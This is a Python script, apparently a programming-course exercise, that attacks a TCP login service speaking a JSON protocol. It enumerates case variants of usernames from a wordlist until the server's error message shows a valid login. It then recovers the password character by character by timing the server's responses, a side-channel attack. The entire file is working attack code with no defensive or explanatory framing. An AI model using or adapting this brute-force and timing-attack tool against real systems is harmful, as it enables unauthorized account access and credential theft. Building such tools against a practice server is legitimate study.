import sys
import socket
import json
from datetime import datetime
from string import ascii_letters
from itertools import product


class PasswordHacker:

    def __init__(self, host, port):
        self.address = (host, int(port))
        self.logins = self.generate_logins()
        self.login = ''
        self.login_found = False
        self.passwords = self.generate_passwords()
        self.password = ''
        self.temporary_password_char = ''
        self.password_prefix = ''
        self.request = None
        self.response = None
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def generate_logins(self):
        with open('/home/stb/Downloads/logins.txt') as file:
            logins = file.read().split()
            for login in logins:
                variants = product(*zip(login.lower(), login.upper()))
                for variant in variants:
                    yield ''.join(variant)

    def generate_passwords(self):
        numbers = ''.join(map(str, range(10)))
        symbols = ascii_letters + numbers
        yield from symbols

    def generate_request(self):
        if not self.login_found:
            self.login = next(self.logins)
        else:
            self.temporary_password_char = next(self.passwords)
        self.password = self.password_prefix + self.temporary_password_char
        self.request = {"login": self.login, "password": self.password}

    def serialize_data(self):
        self.request = json.dumps(self.request).encode()

    def send_data(self):
        self.socket.send(self.request)

    def get_response(self):
        data = self.socket.recv(4096)
        response = json.loads(data)
        self.response = response["result"]

    def main(self):
        with self.socket:
            self.socket.connect(self.address)
            while self.response != "Connection success!":
                self.generate_request()
                self.serialize_data()
                self.send_data()
                start = datetime.now()
                self.get_response()
                delay = datetime.now() - start
                if self.response == "Wrong password!":
                    self.login_found = True
                if delay.total_seconds() >= 0.1:
                    self.password_prefix += self.temporary_password_char
                    self.passwords = self.generate_passwords()
            else:
                print(self.request.decode())


if __name__ == '__main__':
    host, port = sys.argv[1:]
    hacker = PasswordHacker(host, port)
    hacker.main()
